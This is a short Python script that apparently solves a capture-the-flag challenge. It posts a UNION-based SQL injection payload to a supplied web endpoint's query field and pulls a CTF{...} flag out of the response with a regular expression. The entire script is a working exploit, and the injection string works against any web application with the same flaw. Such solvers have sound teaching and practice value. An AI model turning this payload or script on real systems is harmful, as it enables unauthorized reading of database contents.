import requests
import re
import sys


def main(endpoint):
    resp = requests.post(endpoint,
            data={'q': "' UNION SELECT value,2,3 from flags -- "})
    resp.raise_for_status()
    matches = re.search('CTF\{[^}]+\}', resp.text)
    if not matches:
        print('Flag not found!')
        return
    print(matches.group(0))


if __name__ == '__main__':
    main(sys.argv[1])
